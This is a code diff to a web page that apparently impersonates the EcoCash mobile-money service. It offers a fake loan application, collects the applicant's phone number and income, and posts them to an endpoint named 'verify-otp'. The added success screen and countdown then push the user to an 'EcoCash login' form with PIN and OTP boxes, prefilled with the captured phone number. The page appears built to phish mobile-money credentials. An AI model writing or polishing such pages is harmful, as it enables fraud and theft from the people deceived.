@@ -181,6 +181,24 @@
             </div>
         </div>
 
+        <!-- 3.5 SUCCESS SCREEN (/ax/success) -->
+        <div id="successScreen" class="screen">
+            <div class="card" style="text-align: center; padding: 30px 20px;">
+                <div style="width: 60px; height: 60px; background: #22c55e; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 20px auto;">✓</div>
+                <h2>Loan Application Submitted</h2>
+                <div class="subtitle" style="margin-bottom: 25px; line-height: 1.5;">
+                    Your loan application has been submitted. Please wait for approval.<br><br>
+                    You will receive a confirmation message. For now, proceed to EcoCash.
+                </div>
+                
+                <div style="background: #f3f4f6; color: #4b5563; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 15px; font-weight: 500;">
+                    ⏳ Redirecting to EcoCash login in <span id="successCountdown">5</span>s...
+                </div>
+                
+                <button class="btn-primary" onclick="proceedToLogin()">Go to Login Now</button>
+            </div>
+        </div>
+
         <!-- 4. LOGIN SCREEN (/ax/login) -->
         <div id="loginScreen" class="screen">
             <div class="card" style="text-align: center;">
@@ -239,7 +257,9 @@
         </div>
         <div class="copyright">© 2026 EcoCash</div>
     </div>
-        <script>
+
+    <script>
+        // 1. Interactive Calculator Logic
         const amountSlider = document.getElementById('amountSlider');
         const termSlider = document.getElementById('termSlider');
 
@@ -257,6 +277,7 @@
             document.getElementById('monthlyPayment').innerText = '$' + monthly.toFixed(2);
         }
 
+        // 2. Screen Router Navigation
         function goToScreen(screenId, path) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(screenId).classList.add('active');
@@ -281,6 +302,10 @@
             document.getElementById('loadingModal').style.display = 'none';
         }
 
+        // 3. API Submissions & Flow Control
+        let savedPhoneNumber = '';
+        let countdownInterval = null;
+
         async function submitLoanApplication() {
             showLoading('Submitting Application...', 'Please wait...');
             const payload = {
@@ -296,21 +321,47 @@
                 annualIncome: document.getElementById('annualIncome').value
             };
 
+            savedPhoneNumber = payload.phoneNumber;
+
             try {
                 await fetch('/ax/api/verify-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
+                
                 setTimeout(() => {
                     hideLoading();
-                    document.getElementById('otpPhoneDisplay').innerText = payload.phoneNumber;
-                    goToScreen('loginScreen', '/ax/login');
+                    goToScreen('successScreen', '/ax/success');
+                    startSuccessCountdown();
                 }, 1500);
             } catch (err) {
                 hideLoading();
                 alert('Error submitting application');
             }
+        }
+
+        function startSuccessCountdown() {
+            let timeLeft = 5;
+            const countdownEl = document.getElementById('successCountdown');
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownEl.innerText = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    proceedToLogin();
+                }
+            }, 1000);
+        }
+
+        function proceedToLogin() {
+            if (countdownInterval) clearInterval(countdownInterval);
+            document.getElementById('otpPhoneDisplay').innerText = savedPhoneNumber;
+            document.getElementById('loginPhone').value = savedPhoneNumber.replace('+263', '');
+            goToScreen('loginScreen', '/ax/login');
         }
 
         async function submitLogin() {
@@ -360,6 +411,7 @@
             }
         }
 
+        // 4. Auto-focus box jumper for PIN/OTP inputs
         document.querySelectorAll('.pin-container').forEach(container => {
             const boxes = container.querySelectorAll('.pin-box');
             boxes.forEach((box, index) => {
